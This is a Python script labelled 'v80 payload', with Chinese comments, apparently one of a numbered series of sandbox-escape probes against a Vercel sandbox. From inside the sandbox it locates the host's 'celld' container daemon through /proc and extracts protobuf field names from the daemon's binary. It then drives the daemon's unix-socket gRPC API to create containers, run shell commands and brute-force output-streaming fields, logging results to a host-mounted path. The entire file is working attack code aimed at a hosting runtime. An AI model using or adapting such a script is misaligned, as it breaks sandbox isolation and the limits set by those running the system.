# -*- coding: utf-8 -*-
"""v80 payload: celld proto 提取 + StreamOutput 字段大扫描 + ProcessService + Exec 变体
v79 结论: field1=cid + field2=PA + field3~4 各种类型全失败, 统一 "only stdout or stderr can be requested"
假设: (a) stream 标志字段号更大或类型特殊; (b) field2 可能就是 stream 名; (c) StreamOutput 挂在 ProcessService
      (d) Exec 时需指定捕获输出字段
新增: 从 /proc 找宿主 celld 进程, 读其 rootfs 二进制提取真实 proto 字段"""
import socket, time, os, json, struct, re

OUT = '/vercel/sandbox/v80c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v80c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pbool(field_no, v):
    return pvarint((field_no << 3) | 0) + pvarint(1 if v else 0)


def grpc_frame(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def rpc_raw(path, body=b'', ct='application/grpc', t=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:150], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:800].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6, proc_extra=None):
    proc = {"argv": argv}
    if proc_extra:
        proc.update(proc_extra)
    body = json.dumps({"containerId": cid, "process": proc})
    return rpc(ctr + '/Exec', body, t=t)


def try_stream(ctr, cid, pa, label, payload):
    st, hd, bd = rpc_raw(ctr + '/StreamOutput', grpc_frame(payload), 'application/grpc', t=6)
    msg = re.search(rb'Grpc-Message: ([^\r\n]+)', hd.encode())
    m = msg.group(1).decode(errors='replace') if msg else ''
    log('TRY %-30s -> %s | %s | body=%r' % (label, st, m or hd[:60], bd[:200]))


def find_celld():
    """宿主 /proc 找 celld 进程"""
    for pid in sorted(os.listdir('/proc')):
        if not pid.isdigit():
            continue
        try:
            cl = open('/proc/%s/cmdline' % pid, 'rb').read().replace(b'\x00', b' ').decode(errors='replace')
        except Exception:
            continue
        if 'celld' in cl:
            return pid, cl.strip()
    return None, ''


def dump_celld_proto(data, label):
    """从 celld 二进制提取 ExecRequest/StreamOutputRequest 等 proto 字段"""
    txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
    for msg in ['ExecRequest', 'StreamOutputRequest', 'StreamOutputResponse', 'ExecResponse',
                'exec.Request', 'exec.StreamOutputRequest', 'ProcessRequest', 'WaitRequest']:
        try:
            m = re.search(re.escape(msg), txt)
        except Exception:
            continue
        if not m:
            log('%s proto tags: NOT FOUND' % msg)
            continue
        i = m.start()
        seg = txt[i:i + 1600]
        tags = re.findall(r'protobuf:"[^"]+,([0-9]+),opt,name=([a-z_0-9]+)', seg)
        jtags = re.findall(r'json:"([a-z_0-9]+),omitempty"', seg)
        log('%s(%s) proto=%s json=%s' % (msg, label, tags[:16], jtags[:16]))


def main():
    log('V80 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # 1) celld 进程 + 二进制 proto 提取
    pid, cl = find_celld()
    log('celld pid=%s cmd=%s' % (pid, cl[:200]))
    data = None
    if pid:
        for path in ('/proc/%s/root/opt/vercel/celld' % pid, '/proc/%s/exe' % pid):
            try:
                data = open(path, 'rb').read()
                log('read %s size=%d' % (path, len(data)))
                break
            except Exception as e:
                log('read %s ERR %s' % (path, e))
    if not data:
        try:
            data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
            log('fallback /mnt/vdax celld size=%d' % len(data))
        except Exception as e:
            log('fallback ERR %s' % e)
    if data:
        dump_celld_proto(data, 'bin')
        # 全部驼峰字段名 (小写开头, 含 Container/Process/Stream/Output 关键词)
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
        names = set()
        for m in re.finditer(r'protobuf:"[^"]+,([0-9]+),opt,name=([a-z_0-9]+)', txt):
            names.add(m.group(2))
        rel = [n for n in sorted(names) if any(k in n for k in ('stream', 'output', 'stdout', 'stderr',
                                                                'process', 'container', 'exec'))]
        log('REL-FIELDS(%d): %s' % (len(rel), rel))

    # 2) Create/Start
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V80C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # 3) Exec A 长驻
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c',
                      'echo V80_HELLO_STDOUT; echo V80_ERR_STDERR >&2; id; hostname; sleep 60'], t=6)
    PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
    log('execA -> %s | PA=%s' % (st, PA or bd[:150]))
    time.sleep(1)

    base = pstr(1, cid) + pstr(2, PA)
    # 4) field2=stream 名假设
    for s in ('stdout', 'stderr'):
        try_stream(CTR, cid, PA, 'f2=%s' % s, pstr(1, cid) + pstr(2, s))
        time.sleep(0.3)
    # 5) field3~8 大扫描: varint 1/2 + string stdout/stderr
    for fn in range(3, 9):
        for v in (1, 2):
            try_stream(CTR, cid, PA, 'f%d=varint%d' % (fn, v),
                       base + pvarint((fn << 3) | 0) + pvarint(v))
            time.sleep(0.25)
        for s in ('stdout', 'stderr'):
            try_stream(CTR, cid, PA, 'f%d=%s' % (fn, s), base + pstr(fn, s))
            time.sleep(0.25)

    # 6) ProcessService: 真实 PA
    for mth, pl in [('StreamOutput', pstr(1, PA)), ('Wait', pstr(1, PA)),
                    ('StreamOutput', pstr(1, cid) + pstr(2, PA)),
                    ('StreamOutput', pstr(1, PA) + pstr(2, 'stdout'))]:
        st, hd, bd = rpc_raw(PSVC + '/' + mth, grpc_frame(pl), 'application/grpc', t=5)
        msg = re.search(rb'Grpc-Message: ([^\r\n]+)', hd.encode())
        m = msg.group(1).decode(errors='replace') if msg else ''
        log('PSVC %-12s pl=%r -> %s | %s | body=%r' % (mth, pl, st, m or hd[:60], bd[:200]))
        time.sleep(0.3)

    # 7) Exec 变体: terminal/stdout/stream 捕获字段
    for name, extra in [('term', {'terminal': True}), ('stdout', {'stdout': True}),
                        ('stream', {'stream': True}), ('attach', {'attach': True}),
                        ('tty+stream', {'terminal': True, 'stream': True})]:
        st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'echo %s_MARK; sleep 30' % name.upper()],
                          t=6, proc_extra=extra)
        PB = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('exec %s -> %s | PB=%s' % (name, st, PB or bd[:120]))
        time.sleep(0.5)
        if PB:
            try_stream(CTR, cid, PB, '%s f2+stdout' % name, pstr(1, cid) + pstr(2, PB) + pstr(3, 'stdout'))
            time.sleep(0.3)
            try_stream(CTR, cid, PB, '%s f3=varint1' % name,
                       pstr(1, cid) + pstr(2, PB) + pvarint((3 << 3) | 0) + pvarint(1))
            time.sleep(0.3)

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V80C_DONE')


main()
